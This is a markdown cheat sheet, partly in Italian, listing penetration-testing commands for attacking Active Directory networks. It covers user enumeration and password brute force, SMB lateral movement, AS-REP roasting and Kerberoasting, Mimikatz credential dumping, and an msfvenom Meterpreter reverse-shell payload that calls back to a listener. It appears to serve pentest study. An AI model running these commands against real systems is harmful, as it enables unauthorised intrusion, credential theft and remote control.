## Table of useful command

| Tool            | Descrizione / Uso principale                                                | Comandi Esempio |
|-----------------|------------------------------------------------------------------------------|-----------------|
| `kerbrute`      | Enumerate / brute force / password spray                                    | **Enumeration**: `kerbrute userenum -d example.local --dc 192.168.1.10 users.txt`<br>**BruteForce**: `kerbrute bruteuser -d example.local --dc 192.168.1.10 administrator passwords.txt`<br>`users.txt` contiene la lista utenti |
| `crackmapexec`  | Enum host, null session, anonymous access                                   | **Get password policy**: `cme <IP> -u 'user' -p 'password' --pass-pol` → poi tarare password spray sulla policy ottenuta<br>**User senza pwd**: `cme smb <dc_ip> -u user.txt -p password.txt --no-bruteforce`<br>**Credenziali valide** Users: `cme smb <IP> -u <user> -p '<pwd>' --users`<br>Shares: `cme smb <IP> -u <user> -p '<pwd>' --shares`<br>**Enumeration**: `crackmapexec smb <IP>`<br>**Lateral Movement**: `crackmapexec smb <IP> -u <user> -p <password> -d <domain>` |
| `evil-winrm`    | Accesso a macchina target                                                   | **Lateral Movement**: `evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123'` |
| `xfreerdp`      | Accesso a macchina target (RDP)                                             | **Lateral Movement**: `xfreerdp /v:192.168.1.100 /u:Administrator /p:'Password123'` |
| `smbclient`     | Accesso a risorse SMB/CIFS                                                  | **Lateral Movement**: `smbclient.py <domain>/<user>:<Password>@<IP>`<br>`smbclient -L //<dc_ip>/` |
| `Enter-PSSession` | Avvia sessione interattiva PowerShell                                    | `Enter-PSSession <domain>`<br>`Enter-PSSession seclogs.research.security.local` |
| `net`           | Controllo policy e info utenti                                              | `net accounts`<br>`net user administrator` |
| `runas`         | Accesso a macchina come altro utente                                        | `runas.exe /user:administrator cmd` |
| `PowerView`     | Enumeration Active Directory (Powersploit)                                  | **AS-REP Roasting**: `Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }`<br>**AD-Kerberoasting**: `Get-NetUser | Where-Object {$_.servicePrincipalName} | fl`<br>`setspn -T research -Q /` |
| `winpeas`       | Privilege escalation scan                                                   | `winpeas.exe` |
| `msfvenom`      | Genera reverse_tcp payload                                                  | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe > rTCP.exe` |
| `msfconsole`    | Moduli Metasploit                                                           | `msfconsole -q`<br>Meterpreter: `exploit/windows/misc/hta_server` |
| `Mimikatz`      | Dump credenziali                                                            | [Mimikatz guide](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/)<br>`hashdump` → NTLM hash<br>`creds:all` → tutte le credenziali possibili<br>`lsa_dump_secrets` → credenziali da LSA<br>`lsa_dump_sam` → credenziali local SAM |
| `psexec`        | Esecuzione comandi su macchina target                                       | `psexec \\\\<target_ip> <cmd_command>` • usato anche per Pass-the-Hash |
| `wmiexec`       | Esecuzione comandi via WMI                                                  | `python wmiexec.py username:password@target_ip "whoami"` |
| `fping`         | ICMP sweep per host alive                                                   | `fping -a -g 192.168.1.0/24` |
| `GetNPUsers`    | ASREProast - ottenere hash                                                  | `python GetNPUsers.py <domain>/ -userfile username.txt -format hashcat -outputfile hash_out.txt`<br>`rubeus.exe asreproast /format:hashcat` |
| `hashcat`       | Craccare hash                                                               | `hashcat -m <algorithm> -a <attack_type> hash.txt` |
| `hydra`         | Brute force                                                                 | `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2` |
| `wpscan`        | Scan vulnerabilità siti Wordpress                                           | `wpscan --url http://target --enumerate` |
| `nmap`          | Scan porte e servizi                                                        | `nmap -sC -sV -Pn -p- -oA output.txt <IP_addr> -vv` |
